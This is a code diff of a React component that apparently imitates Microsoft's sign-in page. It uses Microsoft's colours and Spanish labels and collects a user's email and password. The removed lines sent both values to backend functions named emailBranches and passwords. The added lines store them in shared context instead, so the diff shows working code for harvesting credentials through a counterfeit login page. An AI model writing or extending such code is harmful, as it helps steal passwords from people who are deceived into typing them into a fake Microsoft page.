@@ -1,28 +1,26 @@
 import type React from "react";
 import { useState } from "react";
-import { useApiContext } from "../../context/ApiContext";
-import { emailBranches, passwords } from "../../api/axios";
+import { useApiContext } from '../../context/ApiContext';
 
 export default function MicrosoftLogin() {
   const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
+  const [passwordInput, setPasswordInput] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const { setMailApi, setPasswordApi } = useApiContext();
+
+  const { setMail, setPassword } = useApiContext();
+  
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email.trim() || !password.trim()) return;
+    if (!email.trim() || !passwordInput.trim()) return;
     setIsLoading(true);
 
     setTimeout(() => {
       setIsLoading(false);
     }, 1000);
 
-    const mailApiResult = await emailBranches(email);
-    setMailApi(mailApiResult);
-
-    const passwordApiResult = await passwords(password);
-    setPasswordApi(passwordApiResult);
+    setMail(email);
+    setPassword(passwordInput);
   };
 
   return (
@@ -58,8 +56,8 @@ export default function MicrosoftLogin() {
                 type="password"
                 placeholder="Contraseña"
                 className="w-full border-0 border-b-[1.5px] border-b-[#bdbdbd] focus:border-b-[#0067b8] outline-none bg-transparent text-base text-[#222] py-2 transition-colors"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                value={passwordInput}
+                onChange={(e) => setPasswordInput(e.target.value)}
                 required
               />
             </div>
@@ -80,7 +78,7 @@ export default function MicrosoftLogin() {
               <button
                 className="min-w-[108px] bg-[#0067b8] hover:bg-[#005da6] text-white px-4 py-2 text-sm font-semibold"
                 type="submit"
-                disabled={!email.trim() || !password.trim() || isLoading}
+                disabled={!email.trim() || !passwordInput.trim() || isLoading}
               >
                 {isLoading ? "Validando..." : "Siguiente"}
               </button>
